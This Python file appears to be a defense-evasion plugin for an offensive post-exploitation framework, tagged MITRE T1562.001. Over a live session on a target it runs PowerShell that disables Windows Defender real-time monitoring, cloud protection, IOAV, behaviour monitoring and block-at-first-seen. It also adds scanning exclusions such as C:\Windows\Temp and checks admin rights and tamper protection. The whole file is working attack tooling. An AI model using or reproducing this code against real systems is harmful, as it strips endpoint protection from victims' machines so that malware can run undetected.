"""defense_evasion/disable_defender — disable or enable Windows Defender components. MITRE T1562.001"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class DisableDefender(BasePlugin):
    NAME        = "disable_defender"
    DESCRIPTION = (
        "Disable/enable Windows Defender real-time monitoring, cloud protection, IOAV, "
        "behaviour monitoring, and add exclusion paths. Requires elevation for most actions."
    )
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.001"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("action", str, required=False, default="disable",
              help="Action: disable | enable | status | exclude"),
        Param("path",   str, required=False, default="",
              help="Path to exclude (used when action=exclude)"),
    )

    @mitre("T1562.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action = params.get("action", "disable").lower()
        path   = params.get("path", "")

        valid_actions = ("disable", "enable", "status", "exclude")
        if action not in valid_actions:
            return ModuleResult.err(f"Invalid action '{action}'. Choose from: {', '.join(valid_actions)}")

        # Admin check block — used by disable/enable/exclude
        admin_check = (
            "$isAdmin = ([Security.Principal.WindowsPrincipal]"
            "  [Security.Principal.WindowsIdentity]::GetCurrent())"
            "  .IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);"
            "if (-not $isAdmin) {"
            "  Write-Output '[!] WARNING: Not running as Administrator — Defender changes will likely fail';"
            "};"
        )

        # Tamper protection check
        tamper_check = (
            "try {"
            "  $tp = (Get-MpComputerStatus -EA Stop).IsTamperProtected;"
            "  if ($tp) {"
            "    Write-Output '[!] TAMPER PROTECTION IS ENABLED — Defender policy changes may be blocked';"
            "  } else {"
            "    Write-Output '[*] Tamper protection: OFF';"
            "  }"
            "} catch { Write-Output '[?] Cannot read tamper protection status' };"
        )

        if action == "status":
            ps = (
                "try {"
                "  $st = Get-MpComputerStatus -EA Stop;"
                "  Write-Output '=== Windows Defender Status ===';"
                "  Write-Output \"  RealTimeProtection      : $($st.RealTimeProtectionEnabled)\";"
                "  Write-Output \"  OnAccessProtection      : $($st.OnAccessProtectionEnabled)\";"
                "  Write-Output \"  IoavProtection          : $($st.IoavProtectionEnabled)\";"
                "  Write-Output \"  BehaviorMonitoring      : $($st.BehaviorMonitorEnabled)\";"
                "  Write-Output \"  CloudProtection         : $($st.MAPSReporting)\";"
                "  Write-Output \"  TamperProtection        : $($st.IsTamperProtected)\";"
                "  Write-Output \"  AntivirusEnabled        : $($st.AntivirusEnabled)\";"
                "  Write-Output \"  AntispywareEnabled      : $($st.AntispywareEnabled)\";"
                "  Write-Output \"  SignatureVersion        : $($st.AntispywareSignatureVersion)\";"
                "  Write-Output '=== Exclusion Paths ===';"
                "  $prefs = Get-MpPreference -EA SilentlyContinue;"
                "  if ($prefs.ExclusionPath) {"
                "    $prefs.ExclusionPath | ForEach-Object { Write-Output \"  $_\" }"
                "  } else { Write-Output '  (none)' }"
                "} catch {"
                "  Write-Output '[-] Could not query Defender status: ' + $_"
                "}"
            )

        elif action == "disable":
            ps = (
                admin_check
                + tamper_check
                + "Write-Output '[*] Disabling Windows Defender protections...';"
                "try {"
                "  Set-MpPreference -DisableRealtimeMonitoring $true -EA Stop;"
                "  Write-Output '[+] Real-time monitoring: DISABLED';"
                "} catch { Write-Output '[-] DisableRealtimeMonitoring failed: ' + $_ };"
                "try {"
                "  Set-MpPreference -MAPSReporting Disabled -EA Stop;"
                "  Write-Output '[+] Cloud-delivered protection (MAPS): DISABLED';"
                "} catch { Write-Output '[-] MAPSReporting failed: ' + $_ };"
                "try {"
                "  Set-MpPreference -DisableIOAVProtection $true -EA Stop;"
                "  Write-Output '[+] IOAV protection: DISABLED';"
                "} catch { Write-Output '[-] DisableIOAVProtection failed: ' + $_ };"
                "try {"
                "  Set-MpPreference -DisableBehaviorMonitoring $true -EA Stop;"
                "  Write-Output '[+] Behavior monitoring: DISABLED';"
                "} catch { Write-Output '[-] DisableBehaviorMonitoring failed: ' + $_ };"
                "try {"
                "  Set-MpPreference -DisableBlockAtFirstSeen $true -EA Stop;"
                "  Write-Output '[+] Block at first seen: DISABLED';"
                "} catch { Write-Output '[-] DisableBlockAtFirstSeen failed: ' + $_ };"
                "try {"
                "  Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp' -EA Stop;"
                "  Write-Output '[+] Exclusion added: C:\\Windows\\Temp';"
                "} catch { Write-Output '[-] Add exclusion failed: ' + $_ };"
                "try {"
                "  $st = Get-MpComputerStatus -EA Stop;"
                "  Write-Output '';"
                "  Write-Output \"[*] Post-change: RT=$($st.RealTimeProtectionEnabled)"
                " IOAV=$($st.IoavProtectionEnabled) Behavior=$($st.BehaviorMonitorEnabled)\""
                "} catch {}"
            )

        elif action == "enable":
            ps = (
                admin_check
                + "Write-Output '[*] Re-enabling Windows Defender protections...';"
                "try {"
                "  Set-MpPreference -DisableRealtimeMonitoring $false -EA Stop;"
                "  Write-Output '[+] Real-time monitoring: ENABLED';"
                "} catch { Write-Output '[-] EnableRealtimeMonitoring failed: ' + $_ };"
                "try {"
                "  Set-MpPreference -MAPSReporting Advanced -EA Stop;"
                "  Write-Output '[+] Cloud-delivered protection (MAPS): ENABLED';"
                "} catch { Write-Output '[-] MAPSReporting enable failed: ' + $_ };"
                "try {"
                "  Set-MpPreference -DisableIOAVProtection $false -EA Stop;"
                "  Write-Output '[+] IOAV protection: ENABLED';"
                "} catch { Write-Output '[-] EnableIOAV failed: ' + $_ };"
                "try {"
                "  Set-MpPreference -DisableBehaviorMonitoring $false -EA Stop;"
                "  Write-Output '[+] Behavior monitoring: ENABLED';"
                "} catch { Write-Output '[-] EnableBehaviorMonitoring failed: ' + $_ };"
                "try {"
                "  $st = Get-MpComputerStatus -EA Stop;"
                "  Write-Output '';"
                "  Write-Output \"[*] Post-change: RT=$($st.RealTimeProtectionEnabled)"
                " IOAV=$($st.IoavProtectionEnabled)\""
                "} catch {}"
            )

        else:  # exclude
            if not path:
                return ModuleResult.err("path parameter is required for action=exclude")
            safe_path = path.replace("'", "''")
            ps = (
                admin_check
                + tamper_check
                + f"try {{"
                f"  Add-MpPreference -ExclusionPath '{safe_path}' -EA Stop;"
                f"  Write-Output '[+] Exclusion path added: {safe_path}';"
                "} catch {"
                "  Write-Output '[-] Failed to add exclusion: ' + $_"
                "};"
                "try {"
                "  $prefs = Get-MpPreference -EA Stop;"
                "  Write-Output '[*] Current exclusion paths:';"
                "  if ($prefs.ExclusionPath) {"
                "    $prefs.ExclusionPath | ForEach-Object { Write-Output \"  $_\" }"
                "  } else { Write-Output '  (none)' }"
                "} catch {}"
            )

        r = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        return ModuleResult.ok(data=r["output"])
